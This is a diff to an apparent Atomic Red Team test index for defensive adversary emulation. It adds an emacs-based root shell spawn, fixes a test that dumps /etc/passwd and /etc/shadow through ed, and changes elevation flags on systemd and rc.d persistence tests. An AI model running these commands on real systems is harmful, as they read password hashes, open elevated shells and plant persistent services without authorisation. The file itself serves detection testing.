@@ -35490,6 +35490,26 @@
 		"phases": ["execution"]
 	},
 	{
+		"name": "emacs spawning an interactive system shell",
+		"auto_generated_guid": "e0742e38-6efe-4dd4-ba5c-2078095b6156",
+		"supported_platforms": ["linux", "macos"],
+		"dependency_executor_name": "bash",
+		"dependencies": [
+			{
+				"description": "Check if emacs is installed on the machine.\n",
+				"prereq_command": "if [ -x \"$(command -v emacs)\" ]; then echo \"emacs is installed\"; else echo \"emacs is NOT installed\"; exit 1; fi\n",
+				"get_prereq_command": "which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs || which brew && brew update && brew install --quiet emacs\n"
+			}
+		],
+		"executor": {
+			"command": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'",
+			"name": "sh",
+			"elevation_required": true
+		},
+		"attack_technique": "T1059.004",
+		"phases": ["execution"]
+	},
+	{
 		"name": "Regasm Uninstall Method Call Test",
 		"auto_generated_guid": "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112",
 		"supported_platforms": ["windows"],
@@ -36572,7 +36592,7 @@
 			}
 		},
 		"executor": {
-			"command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; fi\n",
+			"command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n",
 			"cleanup_command": "rm -f #{output_file}\n",
 			"name": "sh",
 			"elevation_required": true
@@ -36650,7 +36670,7 @@
 			"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n",
 			"cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n",
 			"name": "bash",
-			"elevation_required": false
+			"elevation_required": true
 		},
 		"attack_technique": "T1543.002",
 		"phases": ["persistence", "privilege-escalation"]
@@ -36675,7 +36695,7 @@
 			"command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '#' >> #{rc_service_path}/#{rc_service_file}\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}\necho 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file}\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\necho 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file}\necho 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file}\necho '' >> #{rc_service_path}/#{rc_service_file}\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \necho '{' >> #{rc_service_path}/#{rc_service_file}\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\necho '}' >> #{rc_service_path}/#{rc_service_file}\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \necho 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file}\nchmod +x #{rc_service_path}/#{rc_service_file}\nservice art-test enable\nservice art-test start\n",
 			"cleanup_command": "sysrc -x art_test_enable\nrm -f #{rc_service_path}/#{rc_service_file}\n",
 			"name": "sh",
-			"elevation_required": false
+			"elevation_required": true
 		},
 		"attack_technique": "T1543.002",
 		"phases": ["persistence", "privilege-escalation"]
